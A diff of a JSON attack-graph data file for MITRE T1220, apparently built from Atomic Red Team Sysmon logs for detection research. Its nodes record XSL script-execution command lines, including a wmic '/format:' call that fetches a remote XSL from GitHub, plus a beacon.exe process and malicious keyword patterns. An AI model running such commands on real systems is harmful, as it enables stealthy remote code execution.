@@ -2,17 +2,19 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1220",
-  "generated_at_utc": "2026-05-08T17:49:21.505724+00:00",
-  "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1220\\atomic_red_team\\windows-sysmon.log",
+  "generated_at_utc": "2026-05-08T22:01:24.978610+00:00",
+  "source_file": "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1220\\atomic_red_team\\windows-sysmon.log",
   "source_files": [
-    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1220\\atomic_red_team\\windows-sysmon.log"
+    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1220\\atomic_red_team\\windows-sysmon.log"
   ],
   "patterns": {
     "malicious": [
       "msxsl",
       "format:",
       "beacon",
-      "wmicscript"
+      "wmicscript",
+      "xsl",
+      "jpeg"
     ],
     "whitelist": [
       "lsass.exe",
@@ -49,9 +51,10 @@
     ],
     "core_effect": [
       "msxsl",
-      "wmicscript"
+      "wmicscript",
+      "jpeg"
     ],
-    "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1220_malcious_config.json"
+    "config_path": "D:\\Capstone Project & NCKH\\Multisource Attack Graph\\inspect_log_gui\\data\\T1220_malcious_config.json"
   },
   "matching": {
     "malicious_node_ids": [
@@ -513,45 +516,143 @@
   },
   "nodes": [
     {
-      "id": "Process:{8B6011A9-5BAB-618E-58F3-04000000F101}:1",
-      "label": "cmd.exe",
+      "id": "File:8563e9cb2edf5e5cebf2281a288a98522f431f96b57d4d3f3e3c72c0b20e0893:7",
+      "label": "wshom.ocx",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\wshom.ocx",
+        "source_image_path": "%system32%\\wbem\\wmic.exe",
+        "content_hash": "MD5=2CCC0321D28C4EDC1C256972A34AEE59,SHA256=A6A527A6A7CE62ABDFD2348C26E9D5D87650D66BAC0AA998125335615DE220B3",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "event_id": "7",
+        "id": "File:8563e9cb2edf5e5cebf2281a288a98522f431f96b57d4d3f3e3c72c0b20e0893:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "wshom.ocx",
+        "name": "wshom.ocx"
+      }
+    },
+    {
+      "id": "Registry:65cc72611ac319da6604740526dbcdd64c236747c89f58d09f527e9e91afe09f:12",
+      "label": "NameSpace",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\DESKTOP",
+        "value_name": "NameSpace",
+        "value_data": "CreateKey",
+        "source_image_path": "%system32%\\wbem\\wmic.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "event_id": "12",
+        "id": "Registry:65cc72611ac319da6604740526dbcdd64c236747c89f58d09f527e9e91afe09f:12",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "NameSpace",
+        "name": "NameSpace"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-5BAC-618E-5FF3-04000000F101}:1",
+      "label": "win32calc.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "windows command processor",
-        "guid": "{8B6011A9-5BAB-618E-58F3-04000000F101}",
-        "pid": "9304",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"wmic process list \\format:\"c:\\atomicredteam\\atomics\\t1220\\src\\wmicscript.xsl\"",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
-        "command_hash": "d1b9ff36c847693595590da1f5ab83eebb6680b4f9ecddbd25614b6bfdf7e9c0",
+        "process_name": "windows calculator",
+        "guid": "{8B6011A9-5BAC-618E-5FF3-04000000F101}",
+        "pid": "9388",
+        "image_path": "%system32%\\win32calc.exe",
+        "command_line": "%system32%\\win32calc.exe",
+        "original_file_name": "win32calc.exe",
+        "image_hash": "MD5=B31A19BA38F110838119299B50517073,SHA256=D7B378A4BC4DEAE748462D216D14A20CCB1BAC1D3FFBC67711DB2CC1D8B182B7",
+        "command_hash": "85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b",
         "event_id": "1",
-        "id": "Process:{8B6011A9-5BAB-618E-58F3-04000000F101}:1",
+        "id": "Process:{8B6011A9-5BAC-618E-5FF3-04000000F101}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+        "display_name": "win32calc.exe",
+        "name": "win32calc.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5DF3-04000000F101}:1",
         "user_id": "User:S-1-5-18"
       }
     },
     {
-      "id": "File:69c931e1f5cc7a9ae7b4dd7c66d461fa23802c7c70b3e2db8657c676045d7b27:11",
-      "label": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
+      "id": "File:a2cba089eadb89f535dcaecde0c3319ad05f80db117082107eb93c681cede542:17",
+      "label": "pshost.132811931224397609.7356.defaultappdomain.powershell",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "%localappdata%low\\microsoft\\cryptneturlcache\\content\\edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
-        "source_image_path": "%system32%\\wbem\\wmic.exe",
+        "file_path": "pshost.132811931224397609.7356.defaultappdomain.powershell",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
         "content_hash": "",
-        "parent_process_id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
-        "event_id": "11",
-        "id": "File:69c931e1f5cc7a9ae7b4dd7c66d461fa23802c7c70b3e2db8657c676045d7b27:11",
+        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+        "event_id": "17",
+        "id": "File:a2cba089eadb89f535dcaecde0c3319ad05f80db117082107eb93c681cede542:17",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
-        "name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab"
+        "display_name": "pshost.132811931224397609.7356.defaultappdomain.powershell",
+        "name": "pshost.132811931224397609.7356.defaultappdomain.powershell"
+      }
+    },
+    {
+      "id": "File:dbe04559cecb3d19efb8fae447034b62d02cfc7c2131163e5c3f9091504f5f2f:11",
+      "label": "20211112",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "c:\\pstransactions\\20211112",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+        "event_id": "11",
+        "id": "File:dbe04559cecb3d19efb8fae447034b62d02cfc7c2131163e5c3f9091504f5f2f:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "20211112",
+        "name": "20211112"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:10",
+      "label": "beacon.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "beacon.exe",
+        "guid": "{8B6011A9-E46E-6165-1E2A-00000000F101}",
+        "pid": "4584",
+        "image_path": "%userprofile%\\desktop\\beacon.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1410 for beacon.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "3b3bdd5801eca5f967e5cfea22e193220c6fd4e33d1b78c0a020eebfbeca9cb7",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5AF3-04000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "beacon.exe",
+        "name": "beacon.exe"
+      }
+    },
+    {
+      "id": "Registry:a31abb94fe747ae9f90e9ae25f765817baeeaa26513de820b55dc1ac283d75ed:12",
+      "label": "Calc",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT",
+        "value_name": "Calc",
+        "value_data": "CreateKey",
+        "source_image_path": "%system32%\\win32calc.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
+        "event_id": "12",
+        "id": "Registry:a31abb94fe747ae9f90e9ae25f765817baeeaa26513de820b55dc1ac283d75ed:12",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "Calc",
+        "name": "Calc"
       }
     },
     {
@@ -573,22 +674,21 @@
       }
     },
     {
-      "id": "Registry:07af341c4b0e941256441e5a609eae2877f9fc9cbd26bd0193031ef9431865f6:12",
-      "label": "ApplicationAssociationToasts",
-      "type": "registry",
-      "group": "Registry",
+      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
+      "label": "<pspolicy_test>",
+      "type": "file",
+      "group": "File",
       "properties": {
-        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION",
-        "value_name": "ApplicationAssociationToasts",
-        "value_data": "CreateKey",
-        "source_image_path": "%system32%\\calc.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5DF3-04000000F101}:1",
-        "event_id": "12",
-        "id": "Registry:07af341c4b0e941256441e5a609eae2877f9fc9cbd26bd0193031ef9431865f6:12",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "ApplicationAssociationToasts",
-        "name": "ApplicationAssociationToasts"
+        "file_path": "%temp%\\2\\<pspolicy_test>",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7",
+        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+        "event_id": "23",
+        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "<pspolicy_test>",
+        "name": "<pspolicy_test>"
       }
     },
     {
@@ -616,6 +716,30 @@
       }
     },
     {
+      "id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
+      "label": "win32calc.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows calculator",
+        "guid": "{8B6011A9-5BAC-618E-5EF3-04000000F101}",
+        "pid": "9620",
+        "image_path": "%system32%\\win32calc.exe",
+        "command_line": "%system32%\\win32calc.exe",
+        "original_file_name": "win32calc.exe",
+        "image_hash": "MD5=B31A19BA38F110838119299B50517073,SHA256=D7B378A4BC4DEAE748462D216D14A20CCB1BAC1D3FFBC67711DB2CC1D8B182B7",
+        "command_hash": "85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "win32calc.exe",
+        "name": "win32calc.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
       "id": "Process:{8B6011A9-5BAB-618E-56F3-04000000F101}:1",
       "label": "windows command processor",
       "type": "process",
@@ -640,82 +764,39 @@
       }
     },
     {
-      "id": "File:9cba2815b4b9eff672ddc55eb31cc48fe1ca19ea876bc0a7a17859441bb8d681:17",
-      "label": "pshost.132811931248975312.4192.defaultappdomain.powershell",
+      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
+      "label": "startupprofiledata-noninteractive",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "pshost.132811931248975312.4192.defaultappdomain.powershell",
+        "file_path": "%localappdata%\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{8B6011A9-5BA4-618E-53F3-04000000F101}:1",
-        "event_id": "17",
-        "id": "File:9cba2815b4b9eff672ddc55eb31cc48fe1ca19ea876bc0a7a17859441bb8d681:17",
+        "content_hash": "MD5=446DD1CF97EABA21CF14D03AEBC79F27,SHA256=A7DE5177C68A64BD48B36D49E2853799F4EBCFA8E4761F7CC472F333DC5F65CF",
+        "parent_process_id": "Process:{8B6011A9-5BA4-618E-52F3-04000000F101}:1",
+        "event_id": "23",
+        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "pshost.132811931248975312.4192.defaultappdomain.powershell",
-        "name": "pshost.132811931248975312.4192.defaultappdomain.powershell"
+        "display_name": "startupprofiledata-noninteractive",
+        "name": "startupprofiledata-noninteractive"
       }
     },
     {
-      "id": "Technique:T1220",
-      "label": "T1220",
-      "type": "technique",
-      "group": "Technique",
-      "properties": {
-        "id": "Technique:T1220",
-        "name": "T1220",
-        "display_name": "T1220",
-        "type": "Technique",
-        "entity_class": "Technique"
-      }
-    },
-    {
-      "id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
+      "id": "File:e62a3e93770d6bd9e6b962f0aaa66e92afb26bdedf2e6eeca9e31c94d3f80fe4:7",
       "label": "wmic.exe",
-      "type": "process",
-      "group": "Process",
+      "type": "file",
+      "group": "File",
       "properties": {
-        "process_name": "wmi commandline utility",
-        "guid": "{8B6011A9-5BAC-618E-61F3-04000000F101}",
-        "pid": "8044",
-        "image_path": "%system32%\\wbem\\wmic.exe",
-        "command_line": "wmic  process list \\format:\"https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1220\\src\\wmicscript.xsl",
-        "original_file_name": "wmic.exe",
-        "image_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072",
-        "command_hash": "a62d495051d102eb1141c1ef17fe2e2a6de0b8543e6ed281239a24ad7c5f1f78",
-        "event_id": "1",
-        "id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
+        "file_path": "%system32%\\wbem\\wmic.exe",
+        "source_image_path": "%system32%\\wbem\\wmic.exe",
+        "content_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "event_id": "7",
+        "id": "File:e62a3e93770d6bd9e6b962f0aaa66e92afb26bdedf2e6eeca9e31c94d3f80fe4:7",
+        "type": "File",
+        "entity_class": "FileEntity",
         "display_name": "wmic.exe",
-        "name": "wmic.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAC-618E-60F3-04000000F101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8B6011A9-5BA4-618E-52F3-04000000F101}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{8B6011A9-5BA4-618E-52F3-04000000F101}",
-        "pid": "2156",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" & {if (test-path c:\\atomicredteam\\atomics\\t1220\\src\\msxslscript.xsl) {exit 0} else {exit 1}}",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
-        "command_hash": "3738058c2dd51c8214e4736d586840bd384c094c33997d864978777ea64ec3b8",
-        "event_id": "1",
-        "id": "Process:{8B6011A9-5BA4-618E-52F3-04000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
-        "user_id": "User:S-1-5-18"
+        "name": "wmic.exe"
       }
     },
     {
@@ -743,6 +824,30 @@
       }
     },
     {
+      "id": "Process:{8B6011A9-5BAB-618E-58F3-04000000F101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8B6011A9-5BAB-618E-58F3-04000000F101}",
+        "pid": "9304",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"wmic process list \\format:\"c:\\atomicredteam\\atomics\\t1220\\src\\wmicscript.xsl\"",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
+        "command_hash": "d1b9ff36c847693595590da1f5ab83eebb6680b4f9ecddbd25614b6bfdf7e9c0",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-5BAB-618E-58F3-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
       "id": "Registry:f5d3be7884b6ed2b55f063cb8ac7cf428e2a35389d81d166e07a858390241c11:12",
       "label": "SyncRootManager",
       "type": "registry",
@@ -762,40 +867,143 @@
       }
     },
     {
-      "id": "Registry:65cc72611ac319da6604740526dbcdd64c236747c89f58d09f527e9e91afe09f:12",
-      "label": "NameSpace",
+      "id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
+      "label": "wmic.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "wmi commandline utility",
+        "guid": "{8B6011A9-5BAC-618E-61F3-04000000F101}",
+        "pid": "8044",
+        "image_path": "%system32%\\wbem\\wmic.exe",
+        "command_line": "wmic  process list \\format:\"https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1220\\src\\wmicscript.xsl",
+        "original_file_name": "wmic.exe",
+        "image_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072",
+        "command_hash": "a62d495051d102eb1141c1ef17fe2e2a6de0b8543e6ed281239a24ad7c5f1f78",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "wmic.exe",
+        "name": "wmic.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAC-618E-60F3-04000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Registry:f7d21ef97e196deb4535caef426e513cf157ee67cc43f852bc9a7a73811bff7d:12",
+      "label": "DelegateFolders",
       "type": "registry",
       "group": "Registry",
       "properties": {
-        "key_path": "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\DESKTOP",
-        "value_name": "NameSpace",
+        "key_path": "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\DESKTOP\\NAMESPACE",
+        "value_name": "DelegateFolders",
         "value_data": "CreateKey",
         "source_image_path": "%system32%\\wbem\\wmic.exe",
         "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
         "event_id": "12",
-        "id": "Registry:65cc72611ac319da6604740526dbcdd64c236747c89f58d09f527e9e91afe09f:12",
+        "id": "Registry:f7d21ef97e196deb4535caef426e513cf157ee67cc43f852bc9a7a73811bff7d:12",
         "type": "Registry",
         "entity_class": "RegistryEntity",
-        "display_name": "NameSpace",
-        "name": "NameSpace"
+        "display_name": "DelegateFolders",
+        "name": "DelegateFolders"
       }
     },
     {
-      "id": "Process:{8B6011A9-5BA4-618E-53F3-04000000F101}:1",
+      "id": "File:69c931e1f5cc7a9ae7b4dd7c66d461fa23802c7c70b3e2db8657c676045d7b27:11",
+      "label": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%localappdata%low\\microsoft\\cryptneturlcache\\content\\edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
+        "source_image_path": "%system32%\\wbem\\wmic.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
+        "event_id": "11",
+        "id": "File:69c931e1f5cc7a9ae7b4dd7c66d461fa23802c7c70b3e2db8657c676045d7b27:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
+        "name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab"
+      }
+    },
+    {
+      "id": "Registry:0520e2039d4db402bb6a1ec90046c26c5daebb1f613b706ac83a5051ebbb8b02:12",
+      "label": "Local Settings",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKU\\S-1-5-21-3946589728-3102711660-3528854901-500_CLASSES",
+        "value_name": "Local Settings",
+        "value_data": "CreateKey",
+        "source_image_path": "%system32%\\calc.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
+        "event_id": "12",
+        "id": "Registry:0520e2039d4db402bb6a1ec90046c26c5daebb1f613b706ac83a5051ebbb8b02:12",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "Local Settings",
+        "name": "Local Settings"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+      "label": "wmic.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "wmi commandline utility",
+        "guid": "{8B6011A9-5BAB-618E-59F3-04000000F101}",
+        "pid": "4656",
+        "image_path": "%system32%\\wbem\\wmic.exe",
+        "command_line": "wmic  process list \\format:\"c:\\atomicredteam\\atomics\\t1220\\src\\wmicscript.xsl",
+        "original_file_name": "wmic.exe",
+        "image_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072",
+        "command_hash": "371c5bd5b588a8602b93c2daaf5ecd7baa923a94c08b3992021b47fb7be75f24",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "wmic.exe",
+        "name": "wmic.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-58F3-04000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403:7",
+      "label": "calc.exe",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\calc.exe",
+        "source_image_path": "%system32%\\calc.exe",
+        "content_hash": "MD5=2A5CC198FEFC04C2B6B95207A91D3668,SHA256=04FA16D1FBB5F047E7BF9756E8DDC1365AFEAAB22DD4A2C3F03E067B75BED8EA",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5DF3-04000000F101}:1",
+        "event_id": "7",
+        "id": "File:ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "calc.exe",
+        "name": "calc.exe"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-5BA4-618E-52F3-04000000F101}:1",
       "label": "powershell.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows powershell",
-        "guid": "{8B6011A9-5BA4-618E-53F3-04000000F101}",
-        "pid": "4192",
+        "guid": "{8B6011A9-5BA4-618E-52F3-04000000F101}",
+        "pid": "2156",
         "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" & {if (test-path c:\\atomicredteam\\atomics\\t1220\\src\\wmicscript.xsl) {exit 0} else {exit 1}}",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" & {if (test-path c:\\atomicredteam\\atomics\\t1220\\src\\msxslscript.xsl) {exit 0} else {exit 1}}",
         "original_file_name": "powershell.exe",
         "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
-        "command_hash": "a289c2fa4bd5b61278921db6fdef4c110a51760bf0a6035f7022db4f392d2670",
+        "command_hash": "3738058c2dd51c8214e4736d586840bd384c094c33997d864978777ea64ec3b8",
         "event_id": "1",
-        "id": "Process:{8B6011A9-5BA4-618E-53F3-04000000F101}:1",
+        "id": "Process:{8B6011A9-5BA4-618E-52F3-04000000F101}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "powershell.exe",
@@ -805,17 +1013,121 @@
       }
     },
     {
-      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
+      "id": "Registry:b3c1c9d975e9fb2cb3a1d2aa083ce81cbae57b3b737d62ec14834d187dc8cb50:12",
+      "label": "Software Publishing",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\WINTRUST\\TRUST PROVIDERS",
+        "value_name": "Software Publishing",
+        "value_data": "CreateKey",
+        "source_image_path": "%userprofile%\\desktop\\beacon.exe",
+        "parent_process_id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:1",
+        "event_id": "12",
+        "id": "Registry:b3c1c9d975e9fb2cb3a1d2aa083ce81cbae57b3b737d62ec14834d187dc8cb50:12",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "Software Publishing",
+        "name": "Software Publishing"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{8B6011A9-5BA2-618E-51F3-04000000F101}",
+        "pid": "7356",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" & {if (test-path c:\\atomicredteam\\atomics\\t1220\\src\\msxslxmlfile.xml) {exit 0} else {exit 1}}",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
+        "command_hash": "0c20e3a732ece81e3643ce2b109e74984e5ae595c58f5758f460c22b15d60f95",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Registry:5d309c8edd5ca1a193fd6f4749e21f0baad452b8c2b7036020f8c62c1dd94029:13",
+      "label": "Window_Placement",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\CALC",
+        "value_name": "Window_Placement",
+        "value_data": "Binary Data",
+        "source_image_path": "%system32%\\win32calc.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
+        "event_id": "13",
+        "id": "Registry:5d309c8edd5ca1a193fd6f4749e21f0baad452b8c2b7036020f8c62c1dd94029:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "Window_Placement",
+        "name": "Window_Placement"
+      }
+    },
+    {
+      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
+      "label": "<pspolicy_test>",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%temp%\\2\\<pspolicy_test>",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+        "event_id": "11",
+        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "<pspolicy_test>",
+        "name": "<pspolicy_test>"
+      }
+    },
+    {
